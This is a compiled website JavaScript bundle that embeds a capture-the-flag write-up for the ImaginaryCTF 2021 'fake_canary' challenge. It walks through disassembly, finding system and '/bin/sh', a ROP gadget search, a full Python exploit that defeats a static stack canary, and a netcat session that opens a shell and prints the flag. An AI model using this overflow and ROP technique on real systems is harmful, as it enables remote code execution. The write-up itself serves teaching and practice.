"use strict";(self.webpackChunkwriteups_docs=self.webpackChunkwriteups_docs||[]).push([[9136],{3905:(e,n,t)=>{t.d(n,{Zo:()=>s,kt:()=>x});var a=t(7294);function r(e,n,t){return n in e?Object.defineProperty(e,n,{value:t,enumerable:!0,configurable:!0,writable:!0}):e[n]=t,e}function f(e,n){var t=Object.keys(e);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);n&&(a=a.filter((function(n){return Object.getOwnPropertyDescriptor(e,n).enumerable}))),t.push.apply(t,a)}return t}function p(e){for(var n=1;n<arguments.length;n++){var t=null!=arguments[n]?arguments[n]:{};n%2?f(Object(t),!0).forEach((function(n){r(e,n,t[n])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(t)):f(Object(t)).forEach((function(n){Object.defineProperty(e,n,Object.getOwnPropertyDescriptor(t,n))}))}return e}function o(e,n){if(null==e)return{};var t,a,r=function(e,n){if(null==e)return{};var t,a,r={},f=Object.keys(e);for(a=0;a<f.length;a++)t=f[a],n.indexOf(t)>=0||(r[t]=e[t]);return r}(e,n);if(Object.getOwnPropertySymbols){var f=Object.getOwnPropertySymbols(e);for(a=0;a<f.length;a++)t=f[a],n.indexOf(t)>=0||Object.prototype.propertyIsEnumerable.call(e,t)&&(r[t]=e[t])}return r}var l=a.createContext({}),i=function(e){var n=a.useContext(l),t=n;return e&&(t="function"==typeof e?e(n):p(p({},n),e)),t},s=function(e){var n=i(e.components);return a.createElement(l.Provider,{value:n},e.children)},c="mdxType",d={inlineCode:"code",wrapper:function(e){var n=e.children;return a.createElement(a.Fragment,{},n)}},m=a.forwardRef((function(e,n){var t=e.components,r=e.mdxType,f=e.originalType,l=e.parentName,s=o(e,["components","mdxType","originalType","parentName"]),c=i(t),m=r,x=c["".concat(l,".").concat(m)]||c[m]||d[m]||f;return t?a.createElement(x,p(p({ref:n},s),{},{components:t})):a.createElement(x,p({ref:n},s))}));function x(e,n){var t=arguments,r=n&&n.mdxType;if("string"==typeof e||r){var f=t.length,p=new Array(f);p[0]=m;var o={};for(var l in n)hasOwnProperty.call(n,l)&&(o[l]=n[l]);o.originalType=e,o[c]="string"==typeof e?e:r,p[1]=o;for(var i=2;i<f;i++)p[i]=t[i];return a.createElement.apply(null,p)}return a.createElement.apply(null,t)}m.displayName="MDXCreateElement"},5629:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>l,contentTitle:()=>p,default:()=>c,frontMatter:()=>f,metadata:()=>o,toc:()=>i});var a=t(7462),r=(t(7294),t(3905));const f={},p="FAKE_CANARY",o={unversionedId:"2021/IMAGINARYCTF/challenges/fake_canary",id:"2021/IMAGINARYCTF/challenges/fake_canary",title:"FAKE_CANARY",description:"- File : fakecanary",source:"@site/docs/2021/IMAGINARYCTF/challenges/fake_canary.md",sourceDirName:"2021/IMAGINARYCTF/challenges",slug:"/2021/IMAGINARYCTF/challenges/fake_canary",permalink:"/docs/2021/IMAGINARYCTF/challenges/fake_canary",draft:!1,editUrl:"https://github.com/Pynard/writeups-docs/tree/main/packages/create-docusaurus/templates/shared/docs/2021/IMAGINARYCTF/challenges/fake_canary.md",tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"IMAGINARYCTF",permalink:"/docs/2021/IMAGINARYCTF/"},next:{title:"FLIP_FLOP",permalink:"/docs/2021/IMAGINARYCTF/challenges/flip_flop"}},l={},i=[{value:"Finding system",id:"finding-system",level:2},{value:"Finding &#39;/bin/sh&#39;",id:"finding-binsh",level:2}],s={toc:i};function c(e){let{components:n,...f}=e;return(0,r.kt)("wrapper",(0,a.Z)({},s,f,{components:n,mdxType:"MDXLayout"}),(0,r.kt)("h1",{id:"fake_canary"},"FAKE_CANARY"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"Description\nHere at Stack Smasher Inc, we protect all our stacks with industry grade canaries!\n\nAttachments\nhttps://2021.imaginaryctf.org/r/fake_canary nc chal.imaginaryctf.org 42002\n")),(0,r.kt)("ul",null,(0,r.kt)("li",{parentName:"ul"},"File : ",(0,r.kt)("a",{parentName:"li",href:"../attachements/fake_canary/fake_canary"},"fake_canary"))),(0,r.kt)("p",null,"Here we have to obtain a shell through ",(0,r.kt)("strong",{parentName:"p"},"fake_canary")," via ncat"),(0,r.kt)("p",null,"Looking at the binary we can see a static canary : ",(0,r.kt)("strong",{parentName:"p"},"0xdeadbeef")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},'\u250c 158: main ();\n\u2502           ; var int64_t var_30h @ rbp-0x30\n\u2502           ; var uint32_t var_8h @ rbp-0x8\n\u2502           0x00400687      55             push rbp\n\u2502           0x00400688      4889e5         mov rbp, rsp\n\u2502           0x0040068b      4883ec30       sub rsp, 0x30\n\u2502           0x0040068f      488b05ba0920.  mov rax, qword [obj.stdout] ; obj.__TMC_END__\n\u2502                                                                      ; [0x601050:8]=0\n\u2502           0x00400696      b900000000     mov ecx, 0\n\u2502           0x0040069b      ba02000000     mov edx, 2\n\u2502           0x004006a0      be00000000     mov esi, 0\n\u2502           0x004006a5      4889c7         mov rdi, rax\n\u2502           0x004006a8      e8d3feffff     call sym.imp.setvbuf\n\u2502           0x004006ad      488b05ac0920.  mov rax, qword [obj.stdin]  ; obj.stdin__GLIBC_2.2.5\n\u2502                                                                      ; [0x601060:8]=0\n\u2502           0x004006b4      b900000000     mov ecx, 0\n\u2502           0x004006b9      ba02000000     mov edx, 2\n\u2502           0x004006be      be00000000     mov esi, 0\n\u2502           0x004006c3      4889c7         mov rdi, rax\n\u2502           0x004006c6      e8b5feffff     call sym.imp.setvbuf\n\u2502           0x004006cb      b8efbeadde     mov eax, 0xdeadbeef\n\u2502           0x004006d0      488945f8       mov qword [var_8h], rax\n\u2502           0x004006d4      488d3ded0000.  lea rdi, str.Welcome_to_Stack_Smasher_ ; 0x4007c8 ; "Welcome to Stack Smasher!"\n\u2502           0x004006db      e870feffff     call sym.imp.puts\n\u2502           0x004006e0      488d3dfb0000.  lea rdi, str.Whats_your_name_ ; 0x4007e2 ; "What\'s your name?"\n\u2502           0x004006e7      e864feffff     call sym.imp.puts\n\u2502           0x004006ec      488d45d0       lea rax, [var_30h]\n\u2502           0x004006f0      4889c7         mov rdi, rax\n\u2502           0x004006f3      b800000000     mov eax, 0\n\u2502           0x004006f8      e873feffff     call sym.imp.gets\n\u2502           0x004006fd      b8efbeadde     mov eax, 0xdeadbeef\n\u2502           0x00400702      483945f8       cmp qword [var_8h], rax\n\u2502       \u250c\u2500< 0x00400706      7416           je 0x40071e\n\u2502       \u2502   0x00400708      488d3de90000.  lea rdi, str.HACKER_DETECTED__Program_aborted ; 0x4007f8 ; "**HACKER DETECTED! Program aborted**"\n\u2502       \u2502   0x0040070f      e83cfeffff     call sym.imp.puts\n\u2502       \u2502   0x00400714      bfffffffff     mov edi, 0xffffffff         ; -1\n\u2502       \u2502   0x00400719      e872feffff     call sym.imp.exit\n\u2502       \u2502   ; CODE XREF from main @ 0x400706\n\u2502       \u2514\u2500> 0x0040071e      b800000000     mov eax, 0\n\u2502           0x00400723      c9             leave\n\u2514           0x00400724      c3             ret\n')),(0,r.kt)("p",null,"We need to place ",(0,r.kt)("strong",{parentName:"p"},"0xdeadbeef")," in ",(0,r.kt)("strong",{parentName:"p"},"var_8h @ rbp-0x8")),(0,r.kt)("p",null,"Analyzing the stack with gdb we see that we need a ",(0,r.kt)("strong",{parentName:"p"},"0x28")," padding then ",(0,r.kt)("strong",{parentName:"p"},"0xdeadbeef")),(0,r.kt)("p",null,"Then we need to redirect the code execution to ",(0,r.kt)("strong",{parentName:"p"},"system('/bin/sh')")),(0,r.kt)("h2",{id:"finding-system"},"Finding system"),(0,r.kt)("p",null,"Gladly ",(0,r.kt)("strong",{parentName:"p"},"system")," is in the .plt section"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ objdump -d fake_canary\n[...]\n0000000000400560 <system@plt>:\n  400560:    ff 25 ba 0a 20 00        jmp    *0x200aba(%rip)        # 601020 <system@GLIBC_2.2.5>\n  400566:    68 01 00 00 00           push   $0x1\n  40056b:    e9 d0 ff ff ff           jmp    400540 <.plt>\n[...]\n")),(0,r.kt)("h2",{id:"finding-binsh"},"Finding '/bin/sh'"),(0,r.kt)("p",null,'"/bin/sh/" is also in the binary :'),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},'$ strings -a -t x fake_canary | grep "/bin/sh"\n    81d /bin/sh\n')),(0,r.kt)("p",null,"And the binary start at 0x400000"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"gdb> vmmap\nStart              End                Perm    Name\n0x00400000         0x00401000         r-xp    /home/max/projet/ctf/imaginaryctf/fake_canary/fake_canary\n0x00600000         0x00601000         r--p    /home/max/projet/ctf/imaginaryctf/fake_canary/fake_canary\n0x00601000         0x00602000         rw-p    /home/max/projet/ctf/imaginaryctf/fake_canary/fake_canary\n0x00007ffff7dd1000 0x00007ffff7dd3000 rw-p    mapped\n0x00007ffff7dd3000 0x00007ffff7df9000 r--p    /usr/lib/libc-2.33.so\n0x00007ffff7df9000 0x00007ffff7f44000 r-xp    /usr/lib/libc-2.33.so\n0x00007ffff7f44000 0x00007ffff7f90000 r--p    /usr/lib/libc-2.33.so\n0x00007ffff7f90000 0x00007ffff7f93000 r--p    /usr/lib/libc-2.33.so\n0x00007ffff7f93000 0x00007ffff7f96000 rw-p    /usr/lib/libc-2.33.so\n0x00007ffff7f96000 0x00007ffff7fa1000 rw-p    mapped\n0x00007ffff7fc7000 0x00007ffff7fcb000 r--p    [vvar]\n0x00007ffff7fcb000 0x00007ffff7fcd000 r-xp    [vdso]\n0x00007ffff7fcd000 0x00007ffff7fce000 r--p    /usr/lib/ld-2.33.so\n0x00007ffff7fce000 0x00007ffff7ff2000 r-xp    /usr/lib/ld-2.33.so\n0x00007ffff7ff2000 0x00007ffff7ffb000 r--p    /usr/lib/ld-2.33.so\n0x00007ffff7ffb000 0x00007ffff7ffd000 r--p    /usr/lib/ld-2.33.so\n0x00007ffff7ffd000 0x00007ffff7fff000 rw-p    /usr/lib/ld-2.33.so\n0x00007ffffffde000 0x00007ffffffff000 rw-p    [stack]\n0xffffffffff600000 0xffffffffff601000 --xp    [vsyscall]\n")),(0,r.kt)("p",null,'So "/bin/sh" is at ',(0,r.kt)("strong",{parentName:"p"},"0x40081d")),(0,r.kt)("p",null,"One last thing is to find a ROP gadget to put ",(0,r.kt)("strong",{parentName:"p"},'"/bin/sh"')," in rdi before calling ",(0,r.kt)("strong",{parentName:"p"},"system")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},'$ ropper --file fake_canary --search "% rdi"\n[INFO] Load gadgets from cache\n[LOAD] loading... 100%\n[LOAD] removing double gadgets... 100%\n[INFO] Searching for gadgets: % rdi\n\n[INFO] File: fake_canary\n0x00000000004007a3: pop rdi; ret;\n')),(0,r.kt)("p",null,"Perfect ",(0,r.kt)("strong",{parentName:"p"},"pop rdi")," then ",(0,r.kt)("strong",{parentName:"p"},"ret")," is exactly what we are looking for."),(0,r.kt)("p",null,"Now the payload will look like :"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"[ 0x28 padding ] [ canary ] [ 0x8 padding ] [ ROP ] [ /bin/sh ] [ puts ] [ ROP ] [ bin/sh ] [ system ]\n")),(0,r.kt)("p",null,"I have added ",(0,r.kt)("inlineCode",{parentName:"p"},"[ ROP ] [ /bin/sh ] [ puts ]")," for debug to print ",(0,r.kt)("strong",{parentName:"p"},'"bin/sh"')," before executing system"),(0,r.kt)("p",null,"Here the python script generating the payload"),(0,r.kt)("ul",null,(0,r.kt)("li",{parentName:"ul"},"File : ",(0,r.kt)("a",{target:"_blank",href:t(4361).Z},"exploit.py"),"\nExecuting the exploit :")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-python"},"import struct\n\ncanary = 0xdeadbeef\nsystem = 0x400560 \nputs = 0x400550 \nrop = 0x4007a3\nbinsh = 0x40081d\n\npayload = 'A'*0x28\npayload += struct.pack('Q',canary)\npayload += 'OSEF'*2\npayload += struct.pack('Q',rop)\npayload += struct.pack('Q',binsh)\npayload += struct.pack('Q',puts)\npayload += struct.pack('Q',rop)\npayload += struct.pack('Q',binsh)\npayload += struct.pack('Q',system)\n\nprint(payload)\n")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ ( python2 exploit.py ; cat ) | ncat chal.imaginaryctf.org 42002\nWhat's your name?\n/bin/sh\nid\nuid=1000 gid=1000 groups=1000\nls\nflag.txt\nrun\ncat flag.txt\nictf{m4ke_y0ur_canaries_r4ndom_f492b211}\n")),(0,r.kt)("p",null,"flag : ",(0,r.kt)("inlineCode",{parentName:"p"},"ictf{m4ke_y0ur_canaries_r4ndom_f492b211}")))}c.isMDXComponent=!0},4361:(e,n,t)=>{t.d(n,{Z:()=>a});const a=t.p+"assets/files/exploit-7475a2182930b8a6a311ae20f46cc390.py"}}]);